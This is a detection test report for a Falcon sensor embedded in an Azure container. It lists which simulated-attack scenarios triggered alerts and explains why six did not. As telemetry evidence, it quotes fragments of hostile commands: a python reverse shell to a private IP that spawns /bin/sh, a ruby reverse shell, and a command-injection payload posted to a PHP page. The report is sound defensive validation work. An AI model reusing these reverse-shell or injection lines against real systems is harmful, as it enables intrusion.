# VulnApp Detection Test Report — ACI Image-Embedded Sensor

**Host:** `falcon-aci-demo`
**CID:** `dfe3c164a790457d80f74491aa3f8ac1` (default)
**Sensor:** 7.39.7802.0
**OS:** RHEL 9.7
**Type:** Pod / `AZURE_CONTAINER_INSTANCES`
**Sensor grouping tag:** `SensorGroupingTags/ACI-Container` (baked in via `--falconctl-opts`, confirmed present)
**Date:** 2026-07-09

## Summary

- **14** VulnApp scenarios tested
- **8** scenarios generated detections (**9** detection events — the trojan scenario produced 2 ML detections)
- **6** scenarios produced no detection
- Sensor confirmed working: detections span **21:37–22:03 UTC**, including a Critical rootkit detection

Mapping is authoritative — each detection's parent process was traced back to its triggering `./bin/*.sh` script.

## Detections That Fired

| VulnApp Endpoint | Detection Name | Tactic / Technique | Severity | Action | Triggering Script |
|---|---|---|---|---|---|
| `/reverse_shell_trojan` | LapsangSensorDetect-High, CloudDetect-MLLapsang-High | Machine Learning / Cloud-based ML | High | Would have been killed (prevention off) | `Reverse_Shell_Trojan.sh` |
| `/rootkit` | JynxRootkitInstall | Defense Evasion / Rootkit | Critical | Standard detection | `Defense_Evasion_via_Rootkit.sh` |
| `/credentials_dumping` | CredentialAccessLin | Credential Access / OS Credential Dumping | High | Standard detection | `Credential_Access_via_Credential_Dumping.sh` |
| `/credentials_dumping_collection` | CollectionLin | Collection / Automated Collection | High | Standard detection | `Collection_via_Automated_Collection.sh` |
| `/suspicious_commands` | ExecutionLin | Execution / Command and Scripting Interpreter | High | Standard detection | `Execution_via_Command-Line_Interface.sh` |
| `/data_exfiltration-alternate_protocol` | ExfilViaDNSRequest | Exfiltration / Exfiltration Over Alternative Protocol | High | Would have been killed (prevention off) | `Exfiltration_via_Exfiltration_Over_Alternative_Protocol.sh` |
| `/reverse_shell-obfuscated` | BashReverseShell (python/base64) | Command and Control / Remote Access Tools | High | Would have been killed (prevention off) | `Command_Control_via_Remote_Access-obfuscated.sh` |
| `/reverse_shell` | BashReverseShell (ruby → 192.168.1.222:4444) | Command and Control / Remote Access Tools | High | Would have been killed (prevention off) | `Command_Control_via_Remote_Access.sh` |

## Detections That Did Not Fire

| VulnApp Endpoint | Triggering Script | Likely Reason |
|---|---|---|
| `/data_exfiltration-mysql` | `Webserver_Unexpected_Child_of_Web_Service.sh` | Command-injection against a local PHP app (`curl .../low.php`). The **vulnapp** image never starts Apache/php-fpm (see Key Finding), so nothing listens on :80 → `Connection refused` → the injected command never executes → no malicious child process to detect. |
| `/data_exfiltration-reverse_shell` | `Webserver_Bash_Reverse_Shell.sh` | Same missing-webserver root cause (`curl localhost/low.php` → refused); payload never runs. |
| `/command_injection-suspicious_terminal` | `Webserver_Suspicious_Terminal_Spawn.sh` | Same missing-webserver root cause; payload never runs. |
| `/container_drift` | `ContainerDrift_Via_File_Creation_and_Execution.sh` | **Executed fully** (telemetry-confirmed). Two reasons it didn't detect: (1) on RHEL 9 `/bin/id` is a coreutils multicall wrapper, so when the copied `/bin/id2` runs the sensor resolves `ImageFileName=/usr/bin/coreutils` — a **known-good system binary**, not a novel executable; (2) Container Drift Detection is a container-runtime/CWP feature gated behind the drift-prevention policy and is not emitted by the image-embedded ACI sensor by default. |
| `/ransomware` | `Impact_via_Data_Encrypted_for_Impact.sh` | **Executed** (telemetry-confirmed): exactly **one** file renamed (`mv fakedata.txt fakedata.txt.lockbit`). The "Data Encrypted for Impact" behavioral model needs mass/rapid encryption (many files, entropy change); a single `.lockbit` rename is below the detection threshold. |
| `/remote_service_persistence` | `Persistence_via_External_Remote_Services.sh` | **python ran but spawned no child process** (telemetry-confirmed: 0 children of `python3.9`). The script does `s.connect(("172.17.0.21",5555))` **before** `subprocess.call(["/bin/sh","-"])`; `172.17.0.21` is an unreachable RFC1918 address from ACI, so the blocking connect fails/hangs and `/bin/sh` is never spawned — no reverse-shell behavior to detect. |

## Key Finding — Two Projects, Two Entrypoints

The image deployed here is the **[CrowdStrike/vulnapp](https://github.com/CrowdStrike/vulnapp)** project, which is built `FROM quay.io/crowdstrike/detection-container` and adds a Go **shell2http** front-end so each script is triggerable as an HTTP route (`/rootkit`, `/reverse_shell`, …) on port **8080**. This is the variant the upstream docs point Kubernetes/container users to ("*For Kubernetes environments, refer to the vulnapp project for running the detection container interactively*") because a pod can't easily attach the interactive TTY that the base **[detection-container](https://github.com/CrowdStrike/detection-container)** menu expects.

The two images ship the **same `bin/*.sh` scripts**, but they use **different entrypoints** — and that is what breaks the 3 `Webserver_*` scenarios:

| | `detection-container` (base) | `vulnapp` (what we ran) |
|---|---|---|
| Entrypoint starts | Apache `httpd` + `php-fpm`, then TUI/auto runner | **only** `shell2http` |
| Serves `low.php` on :80 | **Yes** | **No** — binaries/`www` are baked in but never started |
| Webserver-injection scripts work | Yes | No (`Connection refused: port 80`) |

The 3 `Webserver_*` scripts are command-injection attacks **against that local PHP app** (`curl -X POST -d "ip=1.1.1.1 && <cmd>" http://localhost/low.php`). The detection is meant to fire when Apache/PHP spawns an unexpected child. In `detection-container` the entrypoint runs `httpd -k start` so the injection lands and the detection fires; in `vulnapp` the entrypoint never starts the webserver, so nothing listens on :80, the payload never reaches PHP, and no malicious child is ever spawned. **This is an inherent limitation of the shell2http (Kubernetes-interactive) variant — the same root cause as the `Connection refused: port 80` error seen in the UI — not a Falcon or ACI problem.**

**The embedded sensor is working correctly** — all 8 realistically-achievable scenarios fired on this variant, including a Critical rootkit detection and multiple ML/behavioral detections. To exercise all 14, deploy the base `detection-container` image (Apache-backed) directly.

The remaining 3 (`container_drift`, `ransomware`, `remote_service_persistence`) were investigated by pulling the host's `ProcessRollup2` events (aid `7c27605bf0b94197b2f7cebc7fd1df00`, 21:00–22:30 UTC). All three **executed**, but none met detection criteria — and none of the reasons are a Falcon/ACI fault:

- **container_drift** — the copied `/bin/id2` ran, but it resolves to the known-good `/usr/bin/coreutils` multicall binary (not a novel executable), and drift detection is a policy-gated container-runtime feature not emitted by the image-embedded ACI sensor by default.
- **ransomware** — only a single file was renamed to `.lockbit`; the "Data Encrypted for Impact" model requires mass/rapid encryption to fire.
- **remote_service_persistence** — the `python3.9` process ran but had **zero child processes**; its blocking `connect()` to the unreachable `172.17.0.21:5555` fails/hangs before `/bin/sh` is spawned, so there is no reverse-shell behavior to detect (same environmental class as the `Webserver_*` scenarios).

### Telemetry evidence

| Scenario | Key `ProcessRollup2` event | Verdict |
|---|---|---|
| container_drift | `sh -c "... cp /bin/id /bin/id2; /bin/id2 > /dev/null"` → child `/bin/id2` runs as `/usr/bin/coreutils` | Ran; executable resolves to known-good coreutils; drift is policy-gated |
| ransomware | `mv /home/user/something/fakedata.txt .../fakedata.txt.lockbit` (1 file) | Ran; single rename below behavioral threshold |
| remote_service_persistence | `python -c 'socket...connect(("172.17.0.21",5555))...subprocess.call(["/bin/sh","-"])'` — **0 children** | python ran; connect to unreachable IP blocks/fails, shell never spawns |
